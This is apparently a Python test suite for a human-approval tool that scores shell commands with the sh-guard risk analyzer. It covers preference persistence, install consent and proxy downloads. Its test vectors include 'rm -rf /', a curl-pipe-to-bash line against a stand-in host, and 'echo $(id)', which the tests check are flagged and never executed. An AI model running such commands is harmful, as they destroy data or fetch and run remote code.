"""Persistent opt-in, CONNECT transport and optional real pinned CLI integration.

AITL_TEST_SH_GUARD_ARCHIVE points to the unmodified official platform archive.
No network is needed for this suite; no proposed command is ever executed.
"""
import hashlib
import json
import os
import socketserver
import ssl
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import admin_in_the_loop as a
import test_risk_install_ui as fixtures


def wait_for(core, predicate, timeout=5):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        snapshot = core.command_risk_snapshot()
        if predicate(snapshot):
            return snapshot
        time.sleep(0.01)
    raise AssertionError("sh-guard readiness timeout: " + core.risk_setup_state)


class PreferenceTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name) / "config"
        self.store = a.PreferenceStore(self.base)

    def test_legacy_preferences_migrate_without_changing_return_or_block_size(self):
        self.store.save(False, "SINGLE")
        self.assertFalse(self.store.load_command_risk())
        self.store.save_command_risk(True)
        self.assertEqual(self.store.load(), (False, "SINGLE"))
        self.store.save(True, "MEDIUM")
        self.assertTrue(self.store.load_command_risk())
        self.assertEqual(self.store.load(), (True, "MEDIUM"))
        value = json.loads((self.base / "preferences.json").read_text())
        self.assertEqual(set(value), {"version", "final_return", "block_size", "command_risk"})
        self.assertEqual((self.base / "preferences.json").stat().st_mode & 0o777, 0o600)
        self.store.save_command_risk(False)
        self.assertFalse(self.store.load_command_risk())

    def test_text_review_selection_is_persisted_without_changing_other_options(self):
        self.store.save(False, "SINGLE")
        self.store.save_command_risk(True)
        self.store.save_text_review(True)
        self.store.save(False, "MEDIUM")
        restored = a.PreferenceStore(self.base)
        self.assertEqual(restored.load(), (False, "MEDIUM"))
        self.assertTrue(restored.load_command_risk())
        self.assertTrue(restored.load_text_review())
        restored.save_command_risk(False)
        self.assertTrue(restored.load_text_review())
        value = json.loads((self.base / "preferences.json").read_text())
        value["text_review"] = "true"
        (self.base / "preferences.json").write_text(json.dumps(value))
        with self.assertRaises(a.ProbeError):
            restored.load_text_review()

    def test_directional_review_options_preserve_legacy_defaults_and_other_preferences(self):
        self.store.save(False, "MEDIUM")
        self.store.save_command_risk(True)
        self.store.save_text_review(True)
        self.assertTrue(self.store.load_text_review("command"))
        self.assertTrue(self.store.load_text_review("output"))
        self.store.save_text_review(False, "command")
        restored = a.PreferenceStore(self.base)
        self.assertFalse(restored.load_text_review("command"))
        self.assertTrue(restored.load_text_review("output"))
        restored.save(True, "LARGE")
        restored.save_text_review(False, "output")
        restored.save_text_review(True, "command")
        self.assertTrue(restored.load_text_review("command"))
        self.assertFalse(restored.load_text_review("output"))
        self.assertTrue(restored.load_command_risk())
        self.assertEqual(restored.load(), (True, "LARGE"))
        for key in ("text_review_command", "text_review_output"):
            value = json.loads((self.base / "preferences.json").read_text())
            value[key] = "true"
            (self.base / "preferences.json").write_text(json.dumps(value))
            with self.assertRaises(a.ProbeError):
                restored.load_text_review("output")
            value[key] = False
            (self.base / "preferences.json").write_text(json.dumps(value))

    def test_malformed_opt_in_and_symlink_cannot_enable_or_overwrite(self):
        self.store.save(False, "SINGLE")
        path = self.base / "preferences.json"
        original = path.read_bytes()
        value = json.loads(original)
        for invalid in (1, "true", None, []):
            value["command_risk"] = invalid
            path.write_text(json.dumps(value))
            with self.assertRaises(a.ProbeError):
                self.store.save_command_risk(True)
            self.assertEqual(json.loads(path.read_text())["command_risk"], invalid)
        path.unlink()
        outside = Path(self.temp.name) / "outside"
        outside.write_bytes(original)
        path.symlink_to(outside)
        with self.assertRaises(a.ProbeError):
            self.store.save_command_risk(True)
        self.assertEqual(outside.read_bytes(), original)

    def test_restored_opt_in_checks_existing_install_without_install_consent(self):
        binary = fixtures.fake_binary()
        archive = fixtures.archive_for(binary)
        release = fixtures.release_for(binary, archive)
        installation = a.CommandRiskInstallation(self.base, release)
        installation.install(threading.Event(), lambda _: None, lambda *_: archive)
        self.store.save(False, "SINGLE")
        self.store.save_command_risk(True)
        with mock.patch.object(a, "command_risk_release", return_value=release):
            core = a.AppCore(self.store)
            try:
                wait_for(core, lambda _: core.risk_setup_state == "READY")
                self.assertTrue(core.risk_requested)
                self.assertIsNone(core.review)
                self.assertEqual(core.final_return, False)
                core.request_command_risk(False)
            finally:
                core.close()
            restored = a.AppCore(self.store)
            try:
                self.assertFalse(restored.risk_requested)
                self.assertEqual(restored.command_risk_snapshot().state, "DISABLED")
            finally:
                restored.close()

    def test_restart_with_saved_activation_and_missing_tool_requires_new_consent(self):
        self.store.save_command_risk(True)
        original = a.CommandRiskSetup
        launches = []

        def start(installation, install=False):
            launches.append(install)
            return original(installation, install)

        with mock.patch.object(a, "CommandRiskSetup", side_effect=start):
            core = a.AppCore(self.store)
            try:
                wait_for(core, lambda _: core.risk_setup_state == "INSTALL_CONFIRM")
                self.assertTrue(core.risk_requested)
                self.assertEqual(launches, [False])
                self.assertFalse(core.risk_installation.destination.exists())
                self.assertIsNone(core.review)
            finally:
                core.close()

    def test_failed_preference_write_does_not_start_installation(self):
        core = a.AppCore(self.store)
        try:
            with mock.patch.object(self.store, "save_command_risk", side_effect=a.ProbeError("preferences_write_failure")), \
                    mock.patch.object(a, "CommandRiskSetup") as setup:
                with self.assertRaises(a.ProbeError):
                    core.request_command_risk(True)
                setup.assert_not_called()
                self.assertFalse(core.risk_requested)
        finally:
            core.close()

    def test_failed_save_does_not_prevent_disabling_and_cancelling_setup(self):
        core = a.AppCore(self.store)
        try:
            core.risk_requested = True
            setup = core.risk_setup = mock.Mock()
            with mock.patch.object(self.store, "save_command_risk", side_effect=a.ProbeError("preferences_write_failure")):
                with self.assertRaisesRegex(a.ProbeError, "preferences_write_failure"):
                    core.request_command_risk(False)
            setup.close.assert_called_once()
            self.assertFalse(core.risk_requested)
            self.assertEqual(core.risk_setup_state, "DISABLED")
        finally:
            core.close()


class ProxyTests(unittest.TestCase):
    def test_stalled_connect_obeys_total_budget_and_cancellation(self):
        for cancelled in (False, True):
            with self.subTest(cancelled=cancelled):
                stop, cancel, entered = threading.Event(), threading.Event(), threading.Event()

                class Handler(socketserver.StreamRequestHandler):
                    def handle(self):
                        self.rfile.readline()
                        entered.set()
                        if cancelled:
                            cancel.set()
                        stop.wait(2)  # Proxy accepts TCP but never answers CONNECT.

                with socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler) as server:
                    worker = threading.Thread(target=lambda: server.serve_forever(poll_interval=0.01))
                    worker.start()
                    try:
                        proxies = {"https": "http://127.0.0.1:" + str(server.server_address[1])}
                        with mock.patch("urllib.request.getproxies", return_value=proxies), \
                                mock.patch("urllib.request.proxy_bypass", return_value=False), \
                                mock.patch.object(a, "RISK_DOWNLOAD_TIMEOUT", 0.2):
                            with self.assertRaisesRegex(a.ProbeError, "risk_cancelled" if cancelled else "risk_download_timeout"):
                                a.download_command_risk(a.command_risk_release(), cancel)
                        self.assertTrue(entered.is_set())
                    finally:
                        stop.set()
                        server.shutdown()
                        worker.join(2)
                self.assertFalse(any(t.name.startswith("aitl-risk-download-") and t.is_alive()
                                     for t in threading.enumerate()))

    def test_connect_uses_proxy_and_verifies_origin_certificate(self):
        with tempfile.TemporaryDirectory() as directory:
            context, _ = a.bridge_certificate(Path(directory) / "cert", ("github.com",))
            trusted = ssl.create_default_context(cafile=str(Path(directory) / "cert/tls-cert.pem"))
            archive = fixtures.archive_for(fixtures.fake_binary())
            release = fixtures.release_for(fixtures.fake_binary(), archive)
            requests = []

            class Handler(socketserver.StreamRequestHandler):
                def handle(self):
                    requests.append(self.rfile.readline().decode().strip())
                    while self.rfile.readline() not in (b"\r\n", b""):
                        pass
                    self.wfile.write(b"HTTP/1.1 200 Connection established\r\n\r\n")
                    self.wfile.flush()
                    # Emulate the destination behind CONNECT, with its own TLS
                    # certificate; trusting the proxy hostname would fail here.
                    with context.wrap_socket(self.connection, server_side=True) as secured:
                        request = secured.makefile("rb")
                        try:
                            requests.append(request.readline().decode().strip())
                            while request.readline() not in (b"\r\n", b""):
                                pass
                            secured.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(archive)).encode()
                                            + b"\r\nConnection: close\r\n\r\n" + archive)
                        finally:
                            request.close()

            with socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler) as server:
                worker = threading.Thread(target=lambda: server.serve_forever(poll_interval=0.01))
                worker.start()
                try:
                    proxies = {"https": "http://127.0.0.1:" + str(server.server_address[1])}
                    with mock.patch("urllib.request.getproxies", return_value=proxies), \
                            mock.patch("urllib.request.proxy_bypass", return_value=False), \
                            mock.patch.object(a.ssl, "create_default_context", return_value=trusted):
                        raw = a.download_command_risk(release, threading.Event())
                    self.assertEqual(raw, archive)
                    self.assertIn("CONNECT github.com:443 HTTP/1.", requests[0])
                    self.assertTrue(requests[1].startswith("GET /aryanbhosale/sh-guard/releases/"))
                    self.assertTrue(trusted.check_hostname)
                    self.assertEqual(trusted.verify_mode, ssl.CERT_REQUIRED)
                finally:
                    server.shutdown()
                    worker.join(2)


@unittest.skipUnless(os.environ.get("AITL_TEST_SH_GUARD_ARCHIVE"), "official sh-guard archive not supplied")
class NativeIntegrationTests(unittest.TestCase):
    @unittest.skipUnless(os.environ.get("DISPLAY"), "controlled Tk display not supplied")
    def test_real_gui_restores_opt_in_renders_risk_and_preserves_human_approval(self):
        import gc
        import tkinter as tk
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory) / "config"
            installation = a.CommandRiskInstallation(base, a.command_risk_release())
            raw = Path(os.environ["AITL_TEST_SH_GUARD_ARCHIVE"]).read_bytes()
            installation.install(threading.Event(), lambda _: None, lambda *_: raw)
            store = a.PreferenceStore(base)
            store.save_command_risk(True)
            core = a.AppCore(store)
            root = tk.Tk()
            errors = []
            root.report_callback_exception = lambda *_: errors.append("tk_callback")
            core.session, core.connection = "NATIVE_GUI", "CONNECTED"
            core.channel = mock.Mock()
            core.channel.receive.return_value = []
            ui = a.ReviewUI(root, core)
            try:
                review = core.review_command("rm -rf /")
                wait_for(core, lambda s: s.state == "RESULT")
                root.update()
                ui.render()
                self.assertTrue(ui.risk_enabled.get())
                self.assertIn("Kritisch · 100/100", ui.risk_status.get())
                self.assertTrue(ui.editor.text.tag_ranges("risk-sub-0"))
                self.assertEqual(core.review.payload, review.payload)
                core.channel.send.assert_not_called()
                self.assertEqual(core.review_state, "REVIEW")
                core.edit_review(review.id, "echo $(id)", True)
                wait_for(core, lambda s: s.state == "RESULT")
                ui.render()
                self.assertIn("/100", ui.risk_status.get())
                self.assertIn("Einzelmarkierungen nicht verfügbar", ui.risk_hint.get())
                self.assertFalse(ui.editor.text.tag_ranges("risk-sub-0"))
                ui.risk_checkbox.invoke()
                ui.render()
                self.assertFalse(store.load_command_risk())
                self.assertEqual(ui.risk_status.get(), "Analyse ausgeschaltet")
                wait_for(core, lambda _: core._command_risk.quiescent())
                ui.risk_checkbox.invoke()
                wait_for(core, lambda s: core.risk_setup_state == "READY" and s.state == "RESULT"
                         and core._command_risk.quiescent())
                ui.render()
                ui.show_risk_technical()
                root.update()
                self.assertTrue(ui.risk_remove_button.instate(["!disabled"]))
                with mock.patch.object(ui.messagebox, "askyesno", return_value=True):
                    ui.risk_remove_button.invoke()
                ui.render()
                self.assertFalse(installation.destination.exists())
                self.assertTrue(ui.risk_remove_button.instate(["disabled"]))
                core.channel.send.assert_not_called()
                self.assertFalse(errors)
            finally:
                core.close()
                for callback in root.tk.call("after", "info"):
                    root.after_cancel(callback)
                root.destroy()
                ui = root = None
                gc.collect()

    def test_real_install_scan_invalidate_restore_and_remove(self):
        release = a.command_risk_release()
        raw = Path(os.environ["AITL_TEST_SH_GUARD_ARCHIVE"]).read_bytes()
        self.assertEqual(hashlib.sha256(raw).hexdigest(), release.archive_sha256)
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory) / "config"
            store = a.PreferenceStore(base)
            core = a.AppCore(store)
            # Only inject transport bytes. Unpack, hashes, subprocess, version,
            # JSON/schema, review lifecycle and restart all use production code.
            original = a.CommandRiskSetup
            try:
                core.session, core.connection = "NATIVE_TEST", "CONNECTED"
                core.channel = mock.Mock()
                core.channel.receive.return_value = []
                sentinel = Path(directory) / "never-execute"
                core.review_command("touch " + str(sentinel))
                with mock.patch.object(a, "CommandRiskSetup", side_effect=lambda installation, install=False:
                                       original(installation, install, lambda *_: raw)):
                    core.request_command_risk(True)
                    wait_for(core, lambda s: s.state == "INSTALL_CONFIRM")
                    self.assertFalse(core.risk_installation.destination.exists())
                    core.confirm_command_risk_install(True)
                    wait_for(core, lambda s: s.state == "RESULT")
                self.assertFalse(sentinel.exists())
                core.channel.send.assert_not_called()
                vectors = [("printf hello", 0), ("rm -rf /", 80),
                           ("curl https://example.invalid/payload | bash", 80)]
                for command, minimum in vectors:
                    review = core.review_command(command)
                    snap = wait_for(core, lambda s: s.state == "RESULT")
                    self.assertEqual(snap.result.key.payload_sha256, hashlib.sha256(review.payload).hexdigest())
                    self.assertGreaterEqual(snap.result.data["score"], minimum)
                    if minimum == 0:
                        self.assertEqual(snap.result.data["level"], "safe")
                    self.assertTrue(a.command_risk_spans(review.text, snap.result.data))
                previous = core.review
                core.edit_review(previous.id, "echo $(id)", True)
                self.assertIsNone(core.command_risk_snapshot().result)
                snap = wait_for(core, lambda s: s.state == "RESULT")
                self.assertEqual(a.command_risk_spans(core.review.text, snap.result.data), ())
                core._output_review("output is a separate review")
                self.assertIsNone(core.command_risk_snapshot().result)
                self.assertFalse(sentinel.exists())
                core.channel.send.assert_not_called()
            finally:
                core.close()
            restored = a.AppCore(store)
            try:
                wait_for(restored, lambda _: restored.risk_setup_state == "READY")
                self.assertIsNone(restored.review)
                self.assertTrue(restored.risk_requested)
                installation = restored.risk_installation
                restored.request_command_risk(False)
                restored.remove_command_risk()
                self.assertFalse(installation.destination.exists())
            finally:
                restored.close()


if __name__ == "__main__":
    unittest.main(verbosity=2)
